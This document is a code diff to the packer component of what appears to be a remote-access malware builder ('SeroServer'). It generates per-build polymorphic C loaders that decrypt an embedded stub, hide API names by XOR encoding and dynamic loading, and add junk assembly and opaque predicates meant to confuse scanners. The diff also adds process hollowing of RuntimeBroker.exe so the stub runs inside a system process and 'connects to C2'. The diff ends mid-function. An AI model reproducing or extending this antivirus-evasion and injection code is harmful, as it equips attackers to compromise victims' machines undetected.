@@ -6,8 +6,8 @@ using System.Text;
 namespace SeroServer.Builder;
 
 /// <summary>
-/// Custom packer: LZNT1-compress + AES-256-CBC-encrypt the stub, then wrap it in a
-/// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZNT1 decompress,
+/// Custom packer: LZMS-compress + AES-256-CBC-encrypt the stub, then wrap it in a
+/// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZMS decompress,
 /// in-memory PE map + CreateThread at entry point — no child process spawned).
 /// Each build produces a unique binary: different junk symbols, random AES key/IV,
 /// random PE timestamp, polymorphic x64 ASM junk functions.
@@ -91,6 +91,19 @@ public static class CustomPackerBuilder
     private static byte RndRot() =>
         (byte)(RandomNumberGenerator.GetBytes(1)[0] % 61 + 1);  // 1..61
 
+    private record XStr(string Decl, string Var, int Len, byte Key);
+    private static XStr MakeXorStr(string s)
+    {
+        var nm = Rnd("_s");
+        byte k = RandomNumberGenerator.GetBytes(1)[0];
+        if (k == 0) k = 0x5B;
+        var enc = Encoding.ASCII.GetBytes(s).Select(b => (byte)(b ^ k)).ToArray();
+        var d = new StringBuilder($"static unsigned char {nm}[] = {{");
+        foreach (var b in enc) d.Append($"0x{b:X2},");
+        d.Append("0x00};");
+        return new(d.ToString(), nm, enc.Length, k);
+    }
+
     // ── MASM64 polymorphic ASM junk ───────────────────────────────────────────────
 
     private static (string asmSource, string fn1, string fn2, string fn3)
@@ -99,92 +112,154 @@ public static class CustomPackerBuilder
         string fn1 = Rnd("_za");
         string fn2 = Rnd("_zb");
         string fn3 = Rnd("_zc");
+        // Labels inside functions need unique names per build
+        string lbl1a = Rnd("_L");
+        string lbl1b = Rnd("_L");
+        string lbl2a = Rnd("_L");
+        string lbl3a = Rnd("_L");
+        string lbl3b = Rnd("_L");
 
-        ulong i1a = Rnd64(), i1b = Rnd64(), i1c = Rnd64();
-        ulong i2a = Rnd64(), i2b = Rnd64();
-        ulong i3a = Rnd64(), i3b = Rnd64(), i3c = Rnd64();
-        byte r1 = RndRot(), r2 = RndRot(), r3 = RndRot(), r4 = RndRot();
+        // 12 unique 64-bit constants — every build is completely different bytes
+        ulong c0 = Rnd64(), c1 = Rnd64(), c2 = Rnd64(), c3 = Rnd64();
+        ulong c4 = Rnd64(), c5 = Rnd64(), c6 = Rnd64(), c7 = Rnd64();
+        ulong c8 = Rnd64(), c9 = Rnd64(), cA = Rnd64(), cB = Rnd64();
+        byte r1 = RndRot(), r2 = RndRot(), r3 = RndRot();
+        byte r4 = RndRot(), r5 = RndRot(), r6 = RndRot();
+        // Small loop count 3-6 so emulation still terminates quickly
+        byte lc = (byte)(RandomNumberGenerator.GetBytes(1)[0] % 4 + 3);
 
         var src = $$"""
-; Polymorphic x64 ASM dead-code — unique per build
+; Polymorphic x64 dead-code — unique per build
 PUBLIC {{fn1}}
 PUBLIC {{fn2}}
 PUBLIC {{fn3}}
 
 .code
 
-; Function 1: integer register arithmetic junk
+; fn1: integer chain + BSWAP + SHLD + opaque branch
 {{fn1}} PROC
-    push rbx
-    push rdi
-    push rsi
-    sub  rsp, 28h
-    xor  rax, rax
-    mov  rbx, 0{{i1a:X16}}h
-    mov  rdi, 0{{i1b:X16}}h
-    xor  rbx, rdi
-    ror  rbx, {{r1}}
-    imul rbx, rbx, 5
-    mov  rsi, 0{{i1c:X16}}h
-    rol  rsi, {{r2}}
-    add  rdi, rsi
-    xor  rbx, rdi
-    mov  rax, rbx
-    add  rsp, 28h
-    pop  rsi
-    pop  rdi
-    pop  rbx
+    push   rbx
+    push   rdi
+    push   rsi
+    push   r14
+    sub    rsp, 28h
+    mov    rbx, 0{{c0:X16}}h
+    mov    rdi, 0{{c1:X16}}h
+    mov    rsi, 0{{c2:X16}}h
+    mov    r14, 0{{c3:X16}}h
+    bswap  rbx
+    ror    rbx, {{r1}}
+    shld   rdi, rsi, {{r2}}
+    xor    rbx, rdi
+    mov    rax, 0{{c4:X16}}h
+    imul   rsi, rax
+    add    r14, rsi
+    ror    r14, {{r3}}
+    bswap  r14
+    ; opaque predicate: rbx AND NOT rbx is always zero — branch never taken
+    mov    rax, rbx
+    not    rax
+    and    rax, rbx
+    test   rax, rax
+    jnz    {{lbl1a}}
+    lea    rax, [rbx + rdi*2]
+    xor    rax, r14
+    ror    rax, {{r4}}
+    jmp    {{lbl1b}}
+{{lbl1a}}:
+    ; dead path — never reached
+    xor    rax, rax
+{{lbl1b}}:
+    add    rsp, 28h
+    pop    r14
+    pop    rsi
+    pop    rdi
+    pop    rbx
     ret
 {{fn1}} ENDP
 
-; Function 2: stack-memory junk
+; fn2: SSE2 XMM + POPCNT + CMOVNZ + stack locals
 {{fn2}} PROC
-    push rbp
-    push r12
-    push r13
-    sub  rsp, 40h
-    mov  r12, 0{{i2a:X16}}h
-    mov  r13, 0{{i2b:X16}}h
-    xor  r12, r13
-    ror  r12, {{r3}}
-    mov  rbp, rsp
-    add  rbp, 60h
-    mov  QWORD PTR [rbp - 8],  r12
-    mov  QWORD PTR [rbp - 16], r13
-    mov  rax, QWORD PTR [rbp - 8]
-    add  rax, QWORD PTR [rbp - 16]
-    imul rax, rax, 3
-    xor  r12, rax
-    mov  rax, r12
-    add  rsp, 40h
-    pop  r13
-    pop  r12
-    pop  rbp
+    push   rbp
+    push   rbx
+    push   r12
+    push   r15
+    sub    rsp, 60h
+    mov    rbp, rsp
+    mov    rbx, 0{{c5:X16}}h
+    mov    r12, 0{{c6:X16}}h
+    mov    r15, 0{{c7:X16}}h
+    ; XMM operations (SSE2 — always available on x64)
+    movq   xmm0, rbx
+    movq   xmm1, r12
+    pxor   xmm0, xmm1
+    paddq  xmm0, xmm1
+    movq   rbx,  xmm0
+    ; POPCNT: count bits — result unpredictable to scanner
+    popcnt rax, rbx
+    mov    rdi, 0{{c8:X16}}h
+    imul   rax, rdi
+    xor    r15, rax
+    ror    r15, {{r5}}
+    ; write/read locals — looks like real data processing
+    mov    QWORD PTR [rbp + 20h], rbx
+    mov    QWORD PTR [rbp + 28h], r15
+    mov    rax, QWORD PTR [rbp + 20h]
+    add    rax, QWORD PTR [rbp + 28h]
+    ; CMOVNZ: looks like error-path guard
+    xor    r12, r12
+    test   rax, rax
+    cmovnz r12, r15
+    mov    rax, 0{{c9:X16}}h
+    add    r12, rax
+    bswap  r12
+    mov    rax, r12
+    add    rsp, 60h
+    pop    r15
+    pop    r12
+    pop    rbx
+    pop    rbp
     ret
 {{fn2}} ENDP
 
-; Function 3: bit-manipulation chain junk
+; fn3: counter loop + SHRD + bit-scatter + XCHG
 {{fn3}} PROC
-    push rbx
-    push rcx
-    push rdx
-    sub  rsp, 28h
-    mov  rbx, 0{{i3a:X16}}h
-    mov  rcx, 0{{i3b:X16}}h
-    mov  rdx, 0{{i3c:X16}}h
-    xor  rbx, rcx
-    rol  rbx, {{r4}}
-    imul rcx, rdx, 7
-    xor  rdx, rbx
-    add  rcx, rdx
-    ror  rcx, {{r1}}
-    xor  rbx, rcx
-    not  rbx
-    mov  rax, rbx
-    add  rsp, 28h
-    pop  rdx
-    pop  rcx
-    pop  rbx
+    push   rbx
+    push   rcx
+    push   rdx
+    push   r8
+    sub    rsp, 28h
+    mov    rbx, 0{{cA:X16}}h
+    mov    rdx, 0{{cB:X16}}h
+    mov    r8,  0{{c0:X16}}h
+    xor    rcx, rcx
+    ; loop — counter makes opcode stream variable per iteration
+{{lbl3a}}:
+    ror    rbx, {{r6}}
+    shrd   rdx, rbx, {{r1}}
+    xor    r8,  rbx
+    bswap  rbx
+    xchg   rbx, rdx
+    add    r8,  rbx
+    inc    rcx
+    cmp    rcx, {{lc}}
+    jl     {{lbl3a}}
+    ; opaque: x XOR x is always 0 — second branch unreachable
+    mov    rax, r8
+    xor    rax, r8
+    test   rax, rax
+    jnz    {{lbl3b}}
+    lea    rax, [rbx + rdx]
+    ror    rax, {{r3}}
+    jmp    @F
+{{lbl3b}}:
+    xor    rax, rax
+@@:
+    add    rsp, 28h
+    pop    r8
+    pop    rdx
+    pop    rcx
+    pop    rbx
     ret
 {{fn3}} ENDP
 
@@ -256,11 +331,12 @@ END
     private static string GenerateLoaderSource(
         byte[] cipher, byte[] key, byte[] iv,
         uint compressedLen, uint originalLen,
-        string fnAsm1, string fnAsm2, string fnAsm3)
+        string fnAsm1, string fnAsm2, string fnAsm3,
+        string hollowTarget = "RuntimeBroker.exe")
     {
         string fnAes  = Rnd("_a");
         string fnDcmp = Rnd("_b");
-        string fnRun  = Rnd("_c");
+        string fnHol  = Rnd("_c");
         string fnJunk = Rnd("_j");
         string varX   = Rnd("x_");
         string varY   = Rnd("y_");
@@ -268,15 +344,64 @@ END
         uint jk2 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
         uint jk3 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
 
+        // XOR-encoded API name strings — kept in .data, not .rdata import table
+        var sBcrypt = MakeXorStr("bcrypt.dll");
+        var sCab    = MakeXorStr("cabinet.dll");
+        var sBcOA   = MakeXorStr("BCryptOpenAlgorithmProvider");
+        var sBcGP   = MakeXorStr("BCryptGetProperty");
+        var sBcSP   = MakeXorStr("BCryptSetProperty");
+        var sBcGK   = MakeXorStr("BCryptGenerateSymmetricKey");
+        var sBcDc   = MakeXorStr("BCryptDecrypt");
+        var sBcDK   = MakeXorStr("BCryptDestroyKey");
+        var sBcCA   = MakeXorStr("BCryptCloseAlgorithmProvider");
+        var sCrDc   = MakeXorStr("CreateDecompressor");
+        var sDcmpS  = MakeXorStr("Decompress");
+        var sClDc   = MakeXorStr("CloseDecompressor");
+        var sHKey   = MakeXorStr("__SERO_H__");
+        var sHVal   = MakeXorStr("1");
+        var sHTgt   = MakeXorStr(hollowTarget);
+
         return $$"""
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#include <bcrypt.h>
-#include <compressapi.h>
 #include <stdint.h>
 #include <string.h>
-#pragma comment(lib, "bcrypt.lib")
-#pragma comment(lib, "cabinet.lib")
+
+/* BCrypt/Cabinet types — no IAT-linking headers, no #pragma comment(lib,...) */
+typedef LONG NTSTATUS;
+typedef void* BCH;
+typedef void* DCH;
+#define _BCR_OK(s) ((NTSTATUS)(s)>=0)
+#define _BC_PAD    0x00000001UL
+#define _LZM_ALG   5UL
+typedef NTSTATUS(WINAPI*_pBcOA)(BCH*,LPCWSTR,LPCWSTR,ULONG);
+typedef NTSTATUS(WINAPI*_pBcGP)(BCH,LPCWSTR,PUCHAR,ULONG,ULONG*,ULONG);
+typedef NTSTATUS(WINAPI*_pBcSP)(BCH,LPCWSTR,PUCHAR,ULONG,ULONG);
+typedef NTSTATUS(WINAPI*_pBcGK)(BCH,BCH*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
+typedef NTSTATUS(WINAPI*_pBcDc)(BCH,PUCHAR,ULONG,void*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG);
+typedef NTSTATUS(WINAPI*_pBcDK)(BCH);
+typedef NTSTATUS(WINAPI*_pBcCA)(BCH,ULONG);
+typedef BOOL    (WINAPI*_pCrDc)(DWORD,void*,DCH*);
+typedef BOOL    (WINAPI*_pDcmp)(DCH,void*,SIZE_T,void*,SIZE_T,SIZE_T*);
+typedef BOOL    (WINAPI*_pClDc)(DCH);
+/* XOR-encoded API strings */
+{{sBcrypt.Decl}}
+{{sCab.Decl}}
+{{sBcOA.Decl}}
+{{sBcGP.Decl}}
+{{sBcSP.Decl}}
+{{sBcGK.Decl}}
+{{sBcDc.Decl}}
+{{sBcDK.Decl}}
+{{sBcCA.Decl}}
+{{sCrDc.Decl}}
+{{sDcmpS.Decl}}
+{{sClDc.Decl}}
+{{sHKey.Decl}}
+{{sHVal.Decl}}
+{{sHTgt.Decl}}
+static void _xd(unsigned char* p,int n,unsigned char k){int i;for(i=0;i<n;i++)p[i]^=k;p[n]=0;}
+
 
 {{ToCArray(cipher, "g_enc")}}
 {{ToCArray(key,    "g_key")}}
@@ -284,12 +409,10 @@ END
 static const unsigned int g_cmp_size = {{compressedLen}}U;
 static const unsigned int g_org_size = {{originalLen}}U;
 
-/* ── ASM junk (extern — defined in junk.asm, different every build) ── */
 extern unsigned long long {{fnAsm1}}(void);
 extern unsigned long long {{fnAsm2}}(void);
 extern unsigned long long {{fnAsm3}}(void);
 
-/* ── C junk dead-code — optimizer disabled ── */
 #pragma optimize("", off)
 static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
     volatile unsigned int {{varY}} = {{varX}} ^ 0x{{jk1:X8}}U;
@@ -299,131 +422,154 @@ static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
 }
 #pragma optimize("", on)
 
-/* ── AES-256-CBC decrypt via BCrypt ── */
+/* AES-256-CBC decrypt — dynamic BCrypt, no bcrypt.lib in IAT */
 static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, unsigned int* out_len) {
-    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
-    unsigned char keyObj[1024] = {0}; unsigned char* out = NULL;
-    ULONG cbKeyObj = 0, cbData = 0;
-    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto done;
-    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(ULONG), &cbData, 0);
-    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, (cbKeyObj <= sizeof(keyObj)) ? keyObj : NULL, cbKeyObj, (PUCHAR)g_key, g_key_len, 0))) goto done;
-    unsigned char iv_copy[16]; memcpy(iv_copy, g_iv, 16);
-    ULONG plainLen = 0;
-    BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING);
-    out = (unsigned char*)VirtualAlloc(NULL, plainLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    unsigned char _db[14]; memcpy(_db,{{sBcrypt.Var}},{{sBcrypt.Len}}); _xd(_db,{{sBcrypt.Len}},0x{{sBcrypt.Key:X2}});
+    HMODULE hB=LoadLibraryA((LPCSTR)_db); if (!hB) return NULL;
+    unsigned char _n1[30]; memcpy(_n1,{{sBcOA.Var}},{{sBcOA.Len}}); _xd(_n1,{{sBcOA.Len}},0x{{sBcOA.Key:X2}});
+    _pBcOA fOA=(_pBcOA)GetProcAddress(hB,(LPCSTR)_n1);
+    unsigned char _n2[20]; memcpy(_n2,{{sBcGP.Var}},{{sBcGP.Len}}); _xd(_n2,{{sBcGP.Len}},0x{{sBcGP.Key:X2}});
+    _pBcGP fGP=(_pBcGP)GetProcAddress(hB,(LPCSTR)_n2);
+    unsigned char _n3[20]; memcpy(_n3,{{sBcSP.Var}},{{sBcSP.Len}}); _xd(_n3,{{sBcSP.Len}},0x{{sBcSP.Key:X2}});
+    _pBcSP fSP=(_pBcSP)GetProcAddress(hB,(LPCSTR)_n3);
+    unsigned char _n4[30]; memcpy(_n4,{{sBcGK.Var}},{{sBcGK.Len}}); _xd(_n4,{{sBcGK.Len}},0x{{sBcGK.Key:X2}});
+    _pBcGK fGK=(_pBcGK)GetProcAddress(hB,(LPCSTR)_n4);
+    unsigned char _n5[16]; memcpy(_n5,{{sBcDc.Var}},{{sBcDc.Len}}); _xd(_n5,{{sBcDc.Len}},0x{{sBcDc.Key:X2}});
+    _pBcDc fDc=(_pBcDc)GetProcAddress(hB,(LPCSTR)_n5);
+    unsigned char _n6[18]; memcpy(_n6,{{sBcDK.Var}},{{sBcDK.Len}}); _xd(_n6,{{sBcDK.Len}},0x{{sBcDK.Key:X2}});
+    _pBcDK fDK=(_pBcDK)GetProcAddress(hB,(LPCSTR)_n6);
+    unsigned char _n7[32]; memcpy(_n7,{{sBcCA.Var}},{{sBcCA.Len}}); _xd(_n7,{{sBcCA.Len}},0x{{sBcCA.Key:X2}});
+    _pBcCA fCA=(_pBcCA)GetProcAddress(hB,(LPCSTR)_n7);
+    if (!fOA||!fGP||!fSP||!fGK||!fDc||!fDK||!fCA) return NULL;
+    BCH hAlg=NULL,hKey=NULL;
+    unsigned char keyObj[1024]={0}; ULONG cbKeyObj=0,cbData=0;
+    unsigned char* out=NULL;
+    if (!_BCR_OK(fOA(&hAlg,L"AES",NULL,0))) goto done;
+    fGP(hAlg,L"ObjectLength",(PUCHAR)&cbKeyObj,sizeof(ULONG),&cbData,0);
+    fSP(hAlg,L"ChainingMode",(PUCHAR)L"ChainingModeCBC",sizeof(L"ChainingModeCBC"),0);
+    if (!_BCR_OK(fGK(hAlg,&hKey,(cbKeyObj<=sizeof(keyObj))?keyObj:NULL,cbKeyObj,(PUCHAR)g_key,g_key_len,0))) goto done;
+    unsigned char iv_copy[16]; memcpy(iv_copy,g_iv,16);
+    ULONG plainLen=0;
+    fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,NULL,0,&plainLen,_BC_PAD);
+    out=(unsigned char*)VirtualAlloc(NULL,plainLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
     if (!out) goto done;
-    memcpy(iv_copy, g_iv, 16);
-    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, out, plainLen, &cbData, BCRYPT_BLOCK_PADDING))) {
-        VirtualFree(out, 0, MEM_RELEASE); out = NULL;
-    } else { *out_len = cbData; }
+    memcpy(iv_copy,g_iv,16);
+    if (!_BCR_OK(fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,out,plainLen,&cbData,_BC_PAD))) {
+        VirtualFree(out,0,MEM_RELEASE); out=NULL;
+    } else { *out_len=cbData; }
 done:
-    if (hKey) BCryptDestroyKey(hKey);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (hKey) fDK(hKey);
+    if (hAlg) fCA(hAlg,0);
     return out;
 }
 
-/* ── LZMS decompress (Cabinet API — best native Windows ratio) ── */
+/* LZMS decompress — dynamic Cabinet, no cabinet.lib in IAT */
 static unsigned char* {{fnDcmp}}(const unsigned char* src, SIZE_T src_len, SIZE_T out_len) {
-    DECOMPRESSOR_HANDLE hDec = NULL;
-    if (!CreateDecompressor(COMPRESS_ALGORITHM_LZMS, NULL, &hDec)) return NULL;
-    unsigned char* out = (unsigned char*)VirtualAlloc(NULL, out_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if (!out) { CloseDecompressor(hDec); return NULL; }
-    SIZE_T final = 0;
-    BOOL ok = Decompress(hDec, (PVOID)src, src_len, out, out_len, &final);
-    CloseDecompressor(hDec);
-    if (!ok || final != out_len) { VirtualFree(out, 0, MEM_RELEASE); return NULL; }
+    unsigned char _dc[14]; memcpy(_dc,{{sCab.Var}},{{sCab.Len}}); _xd(_dc,{{sCab.Len}},0x{{sCab.Key:X2}});
+    HMODULE hC=LoadLibraryA((LPCSTR)_dc); if (!hC) return NULL;
+    unsigned char _m1[20]; memcpy(_m1,{{sCrDc.Var}},{{sCrDc.Len}}); _xd(_m1,{{sCrDc.Len}},0x{{sCrDc.Key:X2}});
+    _pCrDc fCrDc=(_pCrDc)GetProcAddress(hC,(LPCSTR)_m1);
+    unsigned char _m2[12]; memcpy(_m2,{{sDcmpS.Var}},{{sDcmpS.Len}}); _xd(_m2,{{sDcmpS.Len}},0x{{sDcmpS.Key:X2}});
+    _pDcmp fDcmp=(_pDcmp)GetProcAddress(hC,(LPCSTR)_m2);
+    unsigned char _m3[18]; memcpy(_m3,{{sClDc.Var}},{{sClDc.Len}}); _xd(_m3,{{sClDc.Len}},0x{{sClDc.Key:X2}});
+    _pClDc fClDc=(_pClDc)GetProcAddress(hC,(LPCSTR)_m3);
+    if (!fCrDc||!fDcmp||!fClDc) return NULL;
+    DCH hDec=NULL;
+    if (!fCrDc(_LZM_ALG,NULL,&hDec)) return NULL;
+    unsigned char* out=(unsigned char*)VirtualAlloc(NULL,out_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if (!out) { fClDc(hDec); return NULL; }
+    SIZE_T final=0;
+    BOOL ok=fDcmp(hDec,(PVOID)src,src_len,out,out_len,&final);
+    fClDc(hDec);
+    if (!ok||final!=out_len) { VirtualFree(out,0,MEM_RELEASE); return NULL; }
     return out;
 }
 
-/* ── In-memory PE loader: map in current process + CreateThread at EP ── */
-static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
+/* Hollow target process and inject stub PE */
+static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
     (void)pe_len;
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
-    if (dos->e_magic != 0x5A4D) return 0;
-    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
-    if (nt->Signature != 0x00004550) return 0;
-
-    ULONG_PTR preferred = nt->OptionalHeader.ImageBase;
-    DWORD img_size = nt->OptionalHeader.SizeOfImage;
-
-    LPVOID base = VirtualAlloc((LPVOID)preferred, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!base) base = VirtualAlloc(NULL, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!base) return 0;
-
-    ULONG_PTR delta = (ULONG_PTR)base - preferred;
-
-    memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
-    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)((UCHAR*)nt + sizeof(IMAGE_NT_HEADERS64));
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
-        if (sec[i].SizeOfRawData)
-            memcpy((UCHAR*)base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);
-
-    if (delta && nt->OptionalHeader.DataDirectory[5].Size) {
-        IMAGE_BASE_RELOCATION* rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[5].VirtualAddress);
-        while (rel->VirtualAddress) {
-            WORD* e = (WORD*)((UCHAR*)rel + sizeof(IMAGE_BASE_RELOCATION));
-            DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-            for (DWORD j = 0; j < n; j++) {
-                int type = e[j] >> 12; DWORD off = e[j] & 0xFFF;
-                if (type == 10)      { ULONG_PTR* p = (ULONG_PTR*)((UCHAR*)base + rel->VirtualAddress + off); *p += delta; }
-                else if (type == 3)  { DWORD*     p = (DWORD*)    ((UCHAR*)base + rel->VirtualAddress + off); *p += (DWORD)delta; }
+    IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)pe;
+    if (dos->e_magic!=0x5A4D) return 0;
+    IMAGE_NT_HEADERS64* nt=(IMAGE_NT_HEADERS64*)(pe+dos->e_lfanew);
+    if (nt->Signature!=0x00004550) return 0;
+    ULONG_PTR preferred=(ULONG_PTR)nt->OptionalHeader.ImageBase;
+    DWORD imgSz=nt->OptionalHeader.SizeOfImage;
+    DWORD epRva=nt->OptionalHeader.AddressOfEntryPoint;
+    /* Set env var so hollowed child skips re-hollow and connects to C2 */
+    unsigned char _ek[12]; memcpy(_ek,{{sHKey.Var}},{{sHKey.Len}}); _xd(_ek,{{sHKey.Len}},0x{{sHKey.Key:X2}});
+    unsigned char _ev[4];  memcpy(_ev,{{sHVal.Var}},{{sHVal.Len}}); _xd(_ev,{{sHVal.Len}},0x{{sHVal.Key:X2}});
+    SetEnvironmentVariableA((LPCSTR)_ek,(LPCSTR)_ev);
+    /* Build System32\target path */
+    char tpath[MAX_PATH]={0};
+    GetSystemDirectoryA(tpath,MAX_PATH);
+    int sd=0; while(tpath[sd]) sd++;
+    tpath[sd++]='\\';
+    unsigned char _tn[24]; memcpy(_tn,{{sHTgt.Var}},{{sHTgt.Len}}); _xd(_tn,{{sHTgt.Len}},0x{{sHTgt.Key:X2}});
+    int ti=0; while(_tn[ti]) { tpath[sd++]=(char)_tn[ti++]; }
+    tpath[sd]=0;
+    /* Create target process suspended */
+    STARTUPINFOA si; memset(&si,0,sizeof(si)); si.cb=sizeof(si);
+    PROCESS_INFORMATION pi; memset(&pi,0,sizeof(pi));
+    if (!CreateProcessA(tpath,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) return 0;
+    /* Alloc image region in remote process */
+    LPVOID rem=VirtualAllocEx(pi.hProcess,(LPVOID)preferred,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+    if (!rem) rem=VirtualAllocEx(pi.hProcess,NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+    if (!rem) { TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; }
+    ULONG_PTR remBase=(ULONG_PTR)rem;
+    /* Build local mapped image */
+    unsigned char* img=(unsigned char*)VirtualAlloc(NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
+    if (!img) { TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; }
+    memcpy(img,pe,nt->OptionalHeader.SizeOfHeaders);
+    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)((UCHAR*)nt+sizeof(IMAGE_NT_HEADERS64));
+    for (int i=0;i<nt->FileHeader.NumberOfSections;i++)
+        if (sec[i].SizeOfRawData) memcpy(img+sec[i].VirtualAddress,pe+sec[i].PointerToRawData,sec[i].SizeOfRawData);
+    /* Apply base relocations if needed */
+    ULONG_PTR delta=remBase-preferred;
+    if (delta&&nt->OptionalHeader.DataDirectory[5].Size) {
+        IMAGE_BASE_RELOCATION* rel=(IMAGE_BASE_RELOCATION*)(img+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
+        while(rel->VirtualAddress) {
+            WORD* e=(WORD*)((UCHAR*)rel+sizeof(IMAGE_BASE_RELOCATION));
+            DWORD n=(rel->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
+            for(DWORD j=0;j<n;j++) {
+                int t=e[j]>>12; DWORD off=e[j]&0xFFF;
+                if(t==10) { ULONG_PTR* p=(ULONG_PTR*)(img+rel->VirtualAddress+off); *p+=delta; }
+                else if(t==3) { DWORD* p=(DWORD*)(img+rel->VirtualAddress+off); *p+=(DWORD)delta; }
             }
-            rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)rel + rel->SizeOfBlock);
+            rel=(IMAGE_BASE_RELOCATION*)((UCHAR*)rel+rel->SizeOfBlock);
         }
     }
-
-    if (nt->OptionalHeader.DataDirectory[1].Size) {
-        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[1].VirtualAddress);
-        for (; imp->Name; imp++) {
-            HMODULE hMod = LoadLibraryA((LPCSTR)((UCHAR*)base + imp->Name));
-            if (!hMod) continue;
-            ULONG_PTR* thunk  = (ULONG_PTR*)((UCHAR*)base + (imp->FirstThunk ? imp->FirstThunk : imp->OriginalFirstThunk));
-            ULONG_PTR* oThunk = imp->OriginalFirstThunk ? (ULONG_PTR*)((UCHAR*)base + imp->OriginalFirstThunk) : thunk;
-            for (; *oThunk; thunk++, oThunk++) {
-                FARPROC fn;
-                if (*oThunk & IMAGE_ORDINAL_FLAG64) fn = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL64(*oThunk));
-                else fn = GetProcAddress(hMod, ((IMAGE_IMPORT_BY_NAME*)((UCHAR*)base + *oThunk))->Name);
-                if (fn) *thunk = (ULONG_PTR)fn;
-            }
-        }
+    /* Write image to remote process */
+    SIZE_T wr=0; WriteProcessMemory(pi.hProcess,rem,img,imgSz,&wr);
+    VirtualFree(img,0,MEM_RELEASE);
+    /* Update PEB.ImageBase (Rdx = PEB at thread start on x64) and redirect entry point */
+    CONTEXT ctx; memset(&ctx,0,sizeof(ctx)); ctx.ContextFlags=CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread,&ctx)) {
+        TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0;
     }
-
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        DWORD ch = sec[i].Characteristics, prot = PAGE_READONLY, old = 0;
-        if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
-        else if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
-        else if (ch & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
-        DWORD sz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
-        VirtualProtect((UCHAR*)base + sec[i].VirtualAddress, sz, prot, &old);
-    }
-
-    ULONG_PTR ep = (ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
-    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
+    ULONG_PTR peb=(ULONG_PTR)ctx.Rdx;
+    WriteProcessMemory(pi.hProcess,(LPVOID)(peb+0x10),&remBase,sizeof(remBase),NULL);
+    ctx.Rip=remBase+epRva;
+    SetThreadContext(pi.hThread,&ctx);
+    ResumeThread(pi.hThread);
